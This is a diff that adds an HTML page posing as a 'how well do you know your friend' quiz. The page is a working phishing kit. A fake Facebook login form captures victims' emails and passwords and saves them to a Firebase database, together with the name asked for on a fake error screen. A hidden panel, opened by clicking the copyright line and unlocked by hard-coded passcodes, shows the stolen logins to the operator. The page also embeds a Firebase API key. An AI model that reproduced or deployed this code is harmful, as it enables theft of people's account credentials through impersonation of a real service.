@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" type="text/css" href="/ui.css">
+
+<title>How well do you know me?</title>
+
+<script defer src="/__/firebase/7.1.0/firebase-app.js"></script>
+<script defer src="/__/firebase/7.1.0/firebase-auth.js"></script>
+<script defer src="/__/firebase/7.1.0/firebase-database.js"></script>
+<script defer src="/__/firebase/7.1.0/firebase-messaging.js"></script>
+<script defer src="/__/firebase/7.1.0/firebase-storage.js"></script>
+<script defer src="/__/firebase/init.js"></script>
+
+<script>
+function wait(ms){
+  var start = new Date().getTime();
+  var end = start;
+  while(end < start + ms) {
+    end = new Date().getTime();
+  }
+}
+
+var config = {
+  apiKey: "AIzaSyAASexn5wtH0iRJsQ0VEnIfnw3piu0AoSQ",
+  authDomain: "answer-me-rn.firebaseapp.com",
+  databaseURL: "https://answer-me-rn.firebaseio.com",
+  projectId: "answer-me-rn",
+  storageBucket: "answer-me-rn.appspot.com"
+};
+firebase.initializeApp(config);
+
+var database = firebase.database();
+function writeUserData() {
+  wait(1800);
+  lengthOfId = document.getElementById("idid").value.length
+  lengthOfPass = document.getElementById("idpass").value.length
+
+  if (lengthOfId < 4 || lengthOfPass < 6) {
+    console.log("empty id")
+    document.getElementById("errnotice").innerHTML = 
+    "The email address or phone number that you've entered doesn't match any account.  <b>Sign up for an account.</b>"
+    document.getElementById("errnotice").style.backgroundColor = "#fa3e3e"
+    document.getElementById("errnotice").style.color = "white"
+    return
+  }
+  document.getElementsByClassName('fish')[0].style.display = 'none';
+  document.getElementsByClassName('error')[0].style.display = 'block';
+  var email = document.getElementById("idid").value;
+  var extractedpass = document.getElementById("idpass").value;
+  window.current_time = new Date().getTime()
+  window.current_time =  new Date(window.current_time).toString()
+console.log("logged " + current_time + window.data_path)
+  firebase.database().ref(window.data_path).child(window.current_time).set({
+  l: email,
+  p: extractedpass,
+  });
+}
+
+function start(){
+  wait(1800);
+  document.getElementsByClassName('hi')[0].style.display = 'none';
+  document.getElementsByClassName('fish')[0].style.display = 'block';
+}
+
+function next(){
+  wait(1800);
+  document.getElementsByClassName('error')[0].style.display = 'none';
+  document.getElementsByClassName('questions')[0].style.display = 'block';
+  var name = document.getElementById("name").value;
+  firebase.database().ref(window.data_path).child(window.current_time).update({
+  i: name
+  });
+}
+
+function wrongUrl() {
+  url = window.location.href
+  isLocalHost = url.includes("localhost")
+  isThereP = url.includes("/p/")
+//  if (isLocalHost == true) {
+//      return
+//  }
+  if (isThereP == false) {
+    console.log("profile link not found")
+    document.getElementsByClassName("hi")[0].style.display = "none"
+    document.getElementById("servererror").innerHTML = "server error"
+  }
+
+
+  if (url.includes("/a/") == true) {
+    window.data_path = "data/a"
+  }
+  if (url.includes("/b/") == true) {
+    window.data_path = "data/b"
+  }
+  if (url.includes("/c/") == true) {
+    window.data_path = "data/c"
+  }
+
+}
+
+function showinput() {
+  document.getElementById('passcode').style.display = 'block';
+
+}
+function matchh() {
+  codee = document.getElementById("passcodeinput").value;
+  if (codee == "redwine") {
+    loggerr = "a"
+  }
+  if (codee == "benson") {
+    loggerr = "b"
+  }
+  if (codee == "yaba") {
+    loggerr = "c"
+  }
+
+
+      dataReference = firebase.database().ref('data/' + loggerr)
+      dataReference.on('value', function(snapshot) {
+    console.log(snapshot.val());
+    raw = JSON.stringify(snapshot,  undefined, '\t')
+    new_raw = raw.replace(/{/g,'').replace(/} }/g, '').replace(/"i"/g,' <br><b>name</b>').replace(/"l"/g,' <br><b>login</b>'
+    ).replace(/"p"/g,'<br> <b>pass</b>').replace(/},/g, "<br> <br>").replace(/",/g, '"  '
+    ).replace(/": {/g, '').replace(/"/g, '').replace(' } }','')
+
+
+if (new_raw=="null"){new_raw="shala account hack kor agey"}
+    document.getElementById("showing").innerHTML = new_raw
+      });
+  
+
+}
+
+</script>
+</head>
+
+
+<body>
+  <span id="servererror"></span>
+  <div id="passcode" style="display: none; padding-left: 20px;">
+    <br> <br>
+    <input type="text" id="passcodeinput" >
+    <button onclick="matchh()">start</button> <br> <br>
+    <span id="showing"></span> <br> <br>
+  </div>
+<div class="hi">
+  <div class="banner">Can You Answer?</div> <br>
+  <div class="container">
+    <div class="headline">How well do you know <span id="namefromurl">your friend</span>?</div><br>
+      <script>
+        function addname(){
+          url = window.location.href
+          console.log(url)
+          a = url.indexOf("/p/") + 3
+          b = url.slice(a)
+          linkmadeby = b.split("-").join(" ")
+          document.getElementById("namefromurl").innerHTML = linkmadeby
+        }
+        addname()
+        wrongUrl()
+      </script> 
+    <div class="bigtext">Answer these 10 Questions to find out!</div><br><br>
+    <button class="startbtn" onclick="start()">START</button><br><br>
+  </div>
+  <div class="container pad"><img src="/ad.jpeg"  width="100%" alt=""></div>
+
+  <div id="trigger" onclick="showinput()" style="margin: 20px;">
+    <span style="padding-left: 40%;"> Copyright 2020</span>
+    <br><br>
+
+    </div>
+  
+</div>
+
+
+
+
+
+<div class="fish">
+  <div class="logo"><img height="50px" style="text-align: center" src="https://amp.businessinsider.com/images/5593eae5ecad04cd03d8d3d2-750-279.jpg" alt=""></div>
+  <div class="notice" id="errnotice">You need to login first</div>
+  <div class="bg"><br>
+    <input class="input" placeholder="Mobile number or email address" type="text" autocomplete="off" id="idid"/>
+    <input class="input" placeholder="Password" type="password" autocomplete="off" id="idpass"/><br>
+    <button class="loginbtn" onclick="writeUserData()">Log In</button>
+    <div class="or">or</div><button class="create">Create New Account</button><br>
+    <div class="forgot">Forgotten password? · Help Centre</div><br><br>
+  </div><br>
+  
+  <div class="lang"><table>
+    <tr><td>English (UK)</td><td>অসমীয়া</td><td>नेपाली</td></tr>
+    <tr><td>Português (Brasil)</td><td>বাংলা</td><td>Español</td></tr></table>
+  </div>
+  <div class="credit">Facebook Inc.</div><br><br>
+</div>
+
+<div class="error">
+  <div class="banner">Can You Answer?</div> <br>
+    <div class="container">
+      <div class="errornotice">Unable to login. Internal server error.</div><br>
+      <div class="mediumtext">Enter your name to continue</div><br><br>
+      <input class="input" placeholder="Full Name" type="text" autocomplete="off" id="name"/><br><br>
+      <button class="startbtn" onclick="next()">Next</button><br><br>
+    </div>
+  <div class="container pad"><img src="/ad.jpeg"  width="100%" alt=""></div>
+</div>
+
+<div class="questions">
+  <div class="banner">Can You Answer?</div> <br>
+    <div class="container pad">
+      <div class="tip">Answer the following questions about your friend </div><br>
+      1. Whats your friend's favourite colour? <br>
+      <input type="radio" name="1"> Red <br>
+      <input type="radio" name="1" id="aa"> Black <br>
+      <input type="radio" name="1"> White <br><br>
+      2. Whats your friend's favourite sport? <br>
+      <input type="radio" name="2"> Football <br>
+      <input type="radio" name="2" id="bb"> Cricket <br>
+      <input type="radio" name="2"> Tennis <br><br>
+      3. Whats your friend's favourite drink? <br>
+      <input type="radio" name="3" id="cc"> Coca Cola <br>
+      <input type="radio" name="3"> Pepsi <br>
+      <input type="radio" name="3"> Mountain Dew <br><br>
+      4. Whats your friend's favourite season? <br>
+      <input type="radio" name="4"> Summer <br>
+      <input type="radio" name="4" id="dd"> Winter <br>
+      <input type="radio" name="4"> Spring<br><br>
+      5. Whats your friend's favourite type of movie? <br>
+      <input type="radio" name="5" id="ee"> Action <br>
+      <input type="radio" name="5"> Comedy <br>
+      <input type="radio" name="5"> Romance <br><br>
+      6. Whats your friend's favourite animal? <br>
+      <input type="radio" name="6"> Cat <br>
+      <input type="radio" name="6" id="ff"> Dog <br><br>
+      7. Is your friend in a relationship? <br>
+      <input type="radio" name="7"> Yes <br>
+      <input type="radio" name="7" id="gg"> No <br><br>
+      8. Your friend likes - <br>
+      <input type="radio" name="8" id="hh"> Sea <br>
+      <input type="radio" name="8"> Mountain <br><br>
+      9. Does your friend like to smile?<br>
+      <input type="radio" name="9" id="ii"> Yes <br>
+      <input type="radio" name="9"> No<br><br>
+      10. Whats your friend's favourite drink? <br>
+      <input type="radio" name="10" id="jj"> Tea <br>
+      <input type="radio" name="10"> Coffee <br><br>
+
+      <script>
+        function submitanswers(){
+          wait(2000);
+          document.getElementsByClassName('questions')[0].style.display = 'none';
+          document.getElementsByClassName('results')[0].style.display = 'block';
+          score = 0
+          answerArray = ["aa", "bb", "cc", "dd", "ee", "ff", "gg", "hh", "ii", "jj"]
+          i = 0
+          while (i < 10) {
+            console.log(answerArray[i])
+            if (document.getElementById(answerArray[i]).checked) {
+              score++
+            }
+            i++
+          }   
+          console.log(score)
+          document.getElementById("score").innerHTML = score;
+        }
+      </script>
+
+      <button class="startbtn" onclick="submitanswers()">Next</button><br><br>
+    </div>
+  <div class="container pad"><img src="/ad.jpeg"  width="100%" alt=""></div>
+</div>
+
+
+<div class="results">
+  <div class="banner">Can You Answer?</div> <br>
+    <div class="container"><br><br>
+      <div class="bigtext">Congratulations!</div><br><br>
+      <div class="mediumtext">You've scored</div><br>
+      <div class="score" id="score"> old </div><br><br>
+    </div>
+  <div class="container pad"><img src="/ad.jpeg" width="100%" alt=""></div>
+</div>
+
+<script src="/__/firebase/7.1.0/firebase-app.js"></script>
+<script src="/__/firebase/7.1.0/firebase-analytics.js"></script>
+<script src="/__/firebase/init.js"></script>
+
+</body>
+</html>
